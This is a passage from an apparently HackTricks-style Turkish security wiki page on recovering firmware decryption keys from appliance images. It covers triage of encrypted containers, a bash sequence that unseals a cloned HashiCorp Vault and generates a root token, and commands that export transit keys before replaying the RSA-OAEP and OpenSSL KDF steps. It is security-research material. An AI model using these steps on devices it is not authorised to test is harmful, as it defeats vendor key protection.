- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state'ten firmware decryption keys kurtarma

Bir update image, küçük plaintext metadata'yı büyük bir high-entropy blob ile birlikte içerdiğinde herhangi bir brute-force işleminden önce container triage yapın:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile headers, offsets ve line boundaries'i dump edin.
- `Salted__` genellikle OpenSSL `enc` format'ı anlamına gelir: sonraki 8 byte salt'tır ve kalan byte'lar ciphertext'tir.
- Tam olarak `256` byte'a decode olan bir Base64 field, büyük olasılıkla random firmware password/session key'i saran bir RSA-2048 ciphertext'ine işaret eder.
- Aynı file içindeki detached PGP material genellikle yalnızca authenticity'yi korur; bunun confidentiality mechanism olduğunu varsaymayın.

Static key hunting (`grep`, `strings`, PEM/PGP searches) başarısız olursa yalnızca private keys aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'yi decompile edin ve encrypted blob'u kimin okuduğunu, hangi helper/API'nin bunu unwrap ettiğini ve istenen logical key name'i takip edin.
- Extract edilmiş root filesystem'da KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile birlikte unit files ve init scripts arayın.
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens veya local KMS auto-unseal scripts'lerini private-key material ile eşdeğer kabul edin.

Appliance original Vault binary'sini ve storage backend'ini içeriyorsa, Vault internals'ı yeniden implement etmek yerine bu environment'ı replay etmek genellikle daha kolaydır:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Klonlanmış KMS üzerinde root yetkisiyle:

- Transit key'leri yalnızca izole klon içinde export edilebilir hâle getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key'i export edin: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key'ini, KMS tarafından kullanılan tam padding/hash çiftiyle deneyin. Başarısız bir PKCS#1 v1.5 decrypt işlemi ve başarısız bir varsayılan OAEP decrypt işlemi, key'in yanlış olduğunu **kanıtlamaz**; Vault-backed flow'ların çoğu SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa, AES-CBC decryption işleminden önce vendor'ın OpenSSL KDF'sini tam olarak (`EVP_BytesToKey`, legacy appliance'larda çoğunlukla MD5) yeniden uygulayın.

Bu, "encrypted firmware" konusunu daha genel bir probleme dönüştürür: **appliance tarafındaki operational key'leri kurtarın, ardından tam unwrap + KDF parametrelerini offline olarak yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Cracking: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk edilmiş donanımlardaki zero day'leri Exploiting – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Bir Smart Device Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi mi Görüyorsunuz: Artık Pwned'siniz](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'ı charge port connector'ından Exploiting - Part 2: anti-downgrade bypass'ı](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge'in Over-the-Air Exploitation'ı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
